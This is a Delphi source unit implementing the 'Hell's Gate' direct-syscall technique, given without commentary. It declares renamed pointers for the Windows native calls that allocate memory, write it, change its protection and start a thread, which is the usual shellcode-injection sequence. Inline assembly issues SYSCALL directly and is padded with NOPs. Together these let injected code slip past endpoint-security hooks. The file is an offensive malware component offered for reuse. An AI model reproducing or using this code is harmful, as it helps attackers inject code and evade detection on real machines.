unit HellsGateAsm;
{POINTERMATH ON}
interface

uses
  Windows;

type
  LPTHREAD_START_ROUTINE = function(lpThreadParameter: Pointer): DWORD; stdcall;

  LARGE_INTEGER = record
    case Integer of
      0: (
        LowPart: DWORD;
        HighPart: LongInt);
      1: (
        QuadPart: Int64);
  end;
  PLARGE_INTEGER = ^LARGE_INTEGER;

  THellDescentAllocMem = function(ProcessHandle: THandle; var BaseAddress: Pointer;
    ZeroBits: ULONG_PTR; var RegionSize: SIZE_T; AllocationType, Protect: ULONG): NTSTATUS; stdcall;

  THellDescentWriteMem = function(ProcessHandle: THandle; BaseAddress: Pointer;
    Buffer: Pointer; NumberOfBytesToWrite: SIZE_T; var NumberOfBytesWritten: ULONG): NTSTATUS; stdcall;

  THellDescentProtectMem = function(ProcessHandle: THandle; var BaseAddress: Pointer;
    var RegionSize: SIZE_T; NewProtect: ULONG; var OldProtect: ULONG): NTSTATUS; stdcall;

  THellDescentCreateThread = function(var ThreadHandle: THandle; DesiredAccess: DWORD;
    ObjectAttributes: Pointer; ProcessHandle: THandle; StartRoutine: LPTHREAD_START_ROUTINE;
    Argument: Pointer; CreateFlags: ULONG; ZeroBits: SIZE_T; StackSize: SIZE_T;
    MaximumStackSize: SIZE_T; AttributeList: Pointer): NTSTATUS; stdcall;

  THellDescentWaitObject = function(Handle: THandle; Alertable: BOOLEAN;
    Timeout: PLARGE_INTEGER): NTSTATUS; stdcall;

var
  wSystemCall: Word = 0;

  // Function pointers for each variation
  HellDescentAllocMem: THellDescentAllocMem;
  HellDescentWriteMem: THellDescentWriteMem;
  HellDescentProtectMem: THellDescentProtectMem;
  HellDescentCreateThread: THellDescentCreateThread;
  HellDescentWaitObject: THellDescentWaitObject;

procedure HellsGate(SystemCall: Word); assembler;

implementation

procedure HellsGate(SystemCall: Word);
asm
  NOP
  MOV wSystemCall, 0
  NOP
  MOV wSystemCall, CX
  NOP
end;

procedure RawHellDescent;
asm
  NOP
  MOV RAX, RCX
  NOP
  MOV R10, RAX
  NOP
  MOVZX EAX, wSystemCall
  NOP
  SYSCALL
  RET
end;

initialization
  HellDescentAllocMem := @RawHellDescent;
  HellDescentWriteMem := @RawHellDescent;
  HellDescentProtectMem := @RawHellDescent;
  HellDescentCreateThread := @RawHellDescent;
  HellDescentWaitObject := @RawHellDescent;

end.
